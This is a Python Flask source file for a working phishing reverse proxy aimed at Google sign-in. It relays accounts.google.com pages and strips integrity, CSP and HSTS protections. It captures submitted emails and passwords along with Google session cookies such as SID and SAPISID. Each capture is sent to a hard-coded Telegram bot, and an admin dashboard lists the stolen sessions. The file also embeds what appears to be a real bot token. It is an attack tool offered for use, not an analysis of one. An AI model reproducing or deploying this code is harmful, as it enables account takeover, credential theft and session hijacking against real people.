from flask import Flask, request, render_template, make_response, redirect, url_for, after_this_request
import requests
import logging
import json
from datetime import datetime
import os
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعدادات التيليجرام (يفضل استخدام متغيرات البيئة للأمان)
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')

app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(32).hex()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

captured_sessions = {}
captured_creds = {}

class PhishletEngine:
    def __init__(self, name, target_domain, proxy_hosts, auth_tokens, creds_fields, auth_urls):
        self.name = name
        self.target_domain = target_domain
        self.proxy_hosts = proxy_hosts
        self.auth_tokens = auth_tokens
        self.creds_fields = creds_fields
        self.auth_urls = auth_urls

    def send_to_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
            requests.post(url, json=payload, timeout=10)
        except Exception as e:
            logging.error(f"Telegram error: {e}")

    def notify_visit(self, ip, ua):
        msg = (
            f"👀 <b>New Visitor</b>\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
            f"📱 <b>UA:</b> <code>{ua[:100]}</code>"
        )
        self.send_to_telegram(msg)

    def capture_creds(self, form_data):
        found = {}
        for field in self.creds_fields:
            if field in form_data:
                found[field] = form_data[field]
        for key, value in form_data.items():
            if any(k in key.lower() for k in ['login', 'user', 'pass', 'email', 'mail', 'pwd', 'password']):
                found[key] = value

        if found:
            cred_id = datetime.now().strftime("%y%m%d_%H%M%S")
            cred_data = {
                'site': self.name,
                'credentials': found,
                'timestamp': str(datetime.now()),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent')
            }
            captured_creds[cred_id] = cred_data

            msg = (
                f"🔐 <b>New Credentials Captured</b>\n"
                f"🎯 <b>Target:</b> {self.name}\n"
                f"🆔 <b>ID:</b> <code>{cred_id}</code>\n"
                f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"📋 <b>Data:</b>\n<pre>{json.dumps(found, indent=2, ensure_ascii=False)}</pre>"
            )
            self.send_to_telegram(msg)
            logging.info(f"Credentials: {found}")
        return found

    def capture_full_session(self, cookies_jar, current_host, creds_data=None):
        cookies_dict = {}
        if hasattr(cookies_jar, 'get_dict'):
            cookies_dict = cookies_jar.get_dict()
        else:
            for cookie in cookies_jar:
                cookies_dict[cookie.name] = cookie.value

        auth_indicators = ['SAPISID', 'APISID', 'SSID', 'SID', 'LSID', 'HSID', 'NID',
                           '__Host-GAPS', 'ACCOUNT_CHOOSER', 'LSOSID', 'oauth_token',
                           'session', 'token', 'auth']
        has_auth = any(k in cookies_dict for k in auth_indicators)

        if cookies_dict and has_auth:
            session_id = datetime.now().strftime("%y%m%d_%H%M%S")
            session_data = {
                'site': self.name,
                'cookies': cookies_dict,
                'timestamp': str(datetime.now()),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent')
            }
            captured_sessions[session_id] = session_data

            sample_items = list(cookies_dict.items())[:10]
            cookie_sample = "\n".join([f"<code>{k}</code>: <code>{v[:50]}...</code>" for k, v in sample_items])
            if len(cookies_dict) > 10:
                cookie_sample += f"\n... و {len(cookies_dict)-10} كوكيز أخرى"

            msg = f"🔥 <b>Full Session Hijacked!</b>\n"
            msg += f"🎯 <b>Service:</b> {self.name}\n"
            msg += f"🆔 <b>Session ID:</b> <code>{session_id}</code>\n"
            msg += f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            msg += f"📦 <b>Total Cookies:</b> {len(cookies_dict)}\n"
            if creds_data:
                msg += f"🔐 <b>Credentials also captured!</b>\n"
            msg += f"🍪 <b>Cookies (sample):</b>\n{cookie_sample}\n"
            msg += f"🔗 <b>Dashboard:</b> https://{current_host}/admin/dashboard"
            self.send_to_telegram(msg)
            logging.info(f"Session {session_id} captured with {len(cookies_dict)} cookies")
            return session_id
        return None

    def advanced_rewrite(self, content, content_type, current_host):
        if not any(t in content_type for t in ['html', 'javascript', 'json']):
            return content
        try:
            decoded = content.decode('utf-8', errors='ignore')
            target_pattern = self.target_domain.replace('.', r'\.')
            decoded = re.sub(
                rf'(https?:)?(//)?([a-zA-Z0-9.-]+\.)?{target_pattern}',
                f'https://{current_host}',
                decoded,
                flags=re.IGNORECASE
            )
            decoded = re.sub(r'\bintegrity="[^"]*"', '', decoded, flags=re.IGNORECASE)
            decoded = re.sub(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>', '', decoded, flags=re.IGNORECASE)
            if 'html' in content_type:
                soup = BeautifulSoup(decoded, 'html.parser')
                for tag in soup.find_all(['script', 'link', 'img', 'a', 'form'], src=True):
                    if tag.get('src') and self.target_domain in tag['src']:
                        tag['src'] = tag['src'].replace(f"https://{self.target_domain}", f"https://{current_host}")
                for tag in soup.find_all(['a', 'form'], href=True):
                    if tag.get('href') and self.target_domain in tag['href']:
                        tag['href'] = tag['href'].replace(f"https://{self.target_domain}", f"https://{current_host}")
                decoded = str(soup)
            return decoded.encode('utf-8')
        except Exception as e:
            logging.error(f"Rewrite error: {e}")
            return content

phishlet = PhishletEngine(
    name='Google',
    target_domain='accounts.google.com',
    proxy_hosts=[
        {'phish_sub': 'accounts', 'orig_sub': 'accounts', 'domain': 'google.com'},
        {'phish_sub': 'myaccount', 'orig_sub': 'myaccount', 'domain': 'google.com'},
        {'phish_sub': 'mail', 'orig_sub': 'mail', 'domain': 'google.com'},
        {'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'google.com'}
    ],
    auth_tokens=[
        'SAPISID', 'APISID', 'SSID', 'SID', 'LSID', 'HSID', 'NID',
        '__Host-GAPS', 'ACCOUNT_CHOOSER', 'LSOSID', 'oauth_token'
    ],
    creds_fields=[
        'identifier', 'credentials.passwd', 'email', 'password', 'Passwd', 'passwd'
    ],
    auth_urls=[
        'https://myaccount.google.com',
        'https://mail.google.com',
        'https://accounts.google.com'
    ]
)

# إشعار الزيارة مع منع التكرار باستخدام كوكي (تم التصحيح هنا)
@app.before_request
def check_visit():
    if request.path == '/' and 'visited' not in request.cookies:
        phishlet.notify_visit(request.remote_addr, request.headers.get('User-Agent', 'Unknown'))
        @after_this_request
        def set_visit_cookie(response):
            response.set_cookie('visited', '1', max_age=3600)  # ساعة واحدة
            return response

# المسارات الإدارية
@app.route('/admin/dashboard')
def admin_dashboard():
    try:
        return render_template(
            'dashboard.html',
            sessions=captured_sessions,
            creds=captured_creds,
            bot_username='Amrsavebot'
        )
    except Exception as e:
        return f"Dashboard Error: {str(e)}", 500

@app.route('/admin/session/<session_id>')
def get_session(session_id):
    if session_id in captured_sessions:
        return make_response(
            json.dumps(captured_sessions[session_id], indent=2, ensure_ascii=False),
            200,
            {'Content-Type': 'application/json; charset=utf-8'}
        )
    return "Session not found", 404

@app.route('/admin/cred/<cred_id>')
def get_cred(cred_id):
    if cred_id in captured_creds:
        return make_response(
            json.dumps(captured_creds[cred_id], indent=2, ensure_ascii=False),
            200,
            {'Content-Type': 'application/json; charset=utf-8'}
        )
    return "Credential not found", 404

@app.route('/admin/clear')
def clear_sessions():
    captured_sessions.clear()
    captured_creds.clear()
    return redirect(url_for('admin_dashboard'))

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    host = request.headers.get('Host', '').split(':')[0]
    engine = phishlet

    target_url = f"https://{engine.target_domain}/{path}"

    headers = {}
    for k, v in request.headers:
        if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']:
            headers[k] = v

    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    headers['Referer'] = f"https://{engine.target_domain}/"

    captured_creds_data = None
    if request.method == 'POST' and request.form:
        captured_creds_data = engine.capture_creds(request.form.to_dict())

    try:
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            cookies=request.cookies,
            data=request.get_data(),
            allow_redirects=False,
            verify=False,
            timeout=30
        )

        content = engine.advanced_rewrite(resp.content, resp.headers.get('Content-Type', ''), host)
        proxy_resp = make_response(content)
        proxy_resp.status_code = resp.status_code

        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding',
                            'strict-transport-security', 'content-security-policy']
        for n, v in resp.headers.items():
            if n.lower() not in excluded_headers:
                proxy_resp.headers[n] = v

        for cookie_name, cookie_value in resp.cookies.items():
            proxy_resp.set_cookie(
                cookie_name, cookie_value,
                domain=host, secure=True, httponly=True, samesite='Lax'
            )

        if resp.cookies:
            engine.capture_full_session(resp.cookies, host, captured_creds_data)

        if 'Location' in proxy_resp.headers:
            location = proxy_resp.headers['Location']
            new_location = location.replace(engine.target_domain, host)
            proxy_resp.headers['Location'] = new_location

        return proxy_resp

    except Exception as e:
        logging.error(f"Proxy error: {str(e)}")
        return f"Service Unavailable", 503

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
